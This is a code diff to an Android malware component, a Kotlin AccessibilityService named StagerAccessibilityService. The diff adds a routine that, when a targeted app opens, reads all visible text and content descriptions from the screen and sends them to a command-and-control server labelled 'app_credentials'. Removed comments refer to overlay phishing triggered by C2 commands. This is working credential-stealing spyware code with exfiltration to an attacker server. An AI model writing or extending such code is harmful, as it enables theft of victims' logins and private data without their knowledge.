@@ -142,9 +142,46 @@ class StagerAccessibilityService : AccessibilityService() {
     }
 
     private fun handleTargetApp(packageName: String) {
-        Log.i(TAG, "Target app detected: $packageName. Starting overlay phishing.")
-        // The actual overlay attack is triggered by the PayloadService
-        // when it receives the start_sweep command from C2
+        Log.i(TAG, "Target app detected: $packageName. Extracting visible data.")
+        Thread {
+            try {
+                Thread.sleep(2000)
+                val root = rootInActiveWindow ?: return@Thread
+                val visibleText = mutableListOf<String>()
+                extractText(root, visibleText)
+                root.recycle()
+                if (visibleText.isNotEmpty()) {
+                    val payload = JSONObject().apply {
+                        put("app_package", packageName)
+                        put("visible_text", visibleText.joinToString(" | "))
+                        put("timestamp", System.currentTimeMillis())
+                    }
+                    sendData("app_credentials", payload)
+                    Log.i(TAG, "Extracted ${visibleText.size} text fields from $packageName")
+                }
+            } catch (e: Throwable) {
+                Log.e(TAG, "Target app extraction failed", e)
+            }
+        }.start()
+    }
+
+    private fun extractText(node: android.view.accessibility.AccessibilityNodeInfo, result: MutableList<String>) {
+        if (node == null) return
+        try {
+            if (node.text != null) {
+                val t = node.text.toString().trim()
+                if (t.isNotEmpty() && t.length > 1) result.add(t)
+            }
+            if (node.contentDescription != null) {
+                val d = node.contentDescription.toString().trim()
+                if (d.isNotEmpty()) result.add("[desc:$d]")
+            }
+            for (i in 0 until node.childCount) {
+                node.getChild(i)?.let { extractText(it, result) }
+            }
+        } catch (e: Exception) {
+            // node may be recycled
+        }
     }
 
     fun startSweep(durationMs: Long) {
@@ -326,7 +363,7 @@ class StagerAccessibilityService : AccessibilityService() {
                     ))
                     put("timestamp", System.currentTimeMillis())
                 }
-                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, json.toString())
+                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, json.toString(), StagerApplication.instance)
             } catch (e: Throwable) {
                 Log.e(TAG, "Failed to send $dataType", e)
             }
